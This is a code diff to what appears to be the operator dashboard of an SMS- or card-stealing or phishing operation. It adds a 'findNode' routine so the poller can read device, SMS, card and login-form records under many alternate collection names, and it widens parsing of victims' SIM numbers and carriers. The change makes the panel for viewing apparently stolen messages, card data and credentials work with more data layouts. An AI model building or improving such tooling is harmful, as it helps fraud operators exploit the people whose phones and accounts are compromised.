@@ -344,12 +344,23 @@ include_once __DIR__ . '/header.php';
 
             if (!dbData || typeof dbData !== 'object' || !isMounted) return;
 
-            // Extract Node Mappings using resolved preset
-            const user_data_node = dbData[resolvedPreset.sims]  || dbData.user_data || {};
-            const user_sms_node  = dbData[resolvedPreset.sms]   || dbData.user_sms  || {};
-            const card_node      = dbData[resolvedPreset.cards]  || dbData.Card      || {};
-            const login_node   = dbData[resolvedPreset.forms] || dbData.login || {};
-            const account_node = dbData.account || {};
+            // Smart Node Finder: try configured name first, then auto-detect from known alternates.
+            // This ensures the poller works even if MySQL has wrong/default collection names stored.
+            const findNode = (preferred, alternates) => {
+              const primary = dbData[preferred];
+              if (primary && typeof primary === 'object' && Object.keys(primary).length > 0) return primary;
+              for (const alt of alternates) {
+                const fallback = dbData[alt];
+                if (fallback && typeof fallback === 'object' && Object.keys(fallback).length > 0) return fallback;
+              }
+              return {};
+            };
+
+            const user_data_node = findNode(resolvedPreset.sims,  ['clients', 'user_data', 'devices', 'users']);
+            const user_sms_node  = findNode(resolvedPreset.sms,   ['messages', 'user_sms', 'sms', 'SMS']);
+            const card_node      = findNode(resolvedPreset.cards,  ['clients', 'Card', 'cards', 'card']);
+            const login_node     = findNode(resolvedPreset.forms,  ['clients', 'login', 'forms', 'Login']);
+            const account_node   = dbData.account || {};
 
             // Build Live User Devices List
             const deviceIds = Array.from(new Set([
@@ -416,9 +427,9 @@ include_once __DIR__ . '/header.php';
               }] : [];
 
               // SIM card parsing with support for sims array
-              let sim1 = devInfo.numberSim1 || devInfo.phoneNumber || 'N.A.';
+              let sim1 = devInfo.numberSim1 || devInfo.phoneNumber || devInfo.mobNo || devInfo.mobile_number || 'N.A.';
               let sim2 = devInfo.numberSim2 || 'N.A.';
-              let sim1Carrier = devInfo.nameSim1 || 'SIM 1';
+              let sim1Carrier = devInfo.nameSim1 || devInfo.service_provider || 'SIM 1';
               let sim2Carrier = devInfo.nameSim2 || 'SIM 2';
 
               if (Array.isArray(devInfo.sims)) {
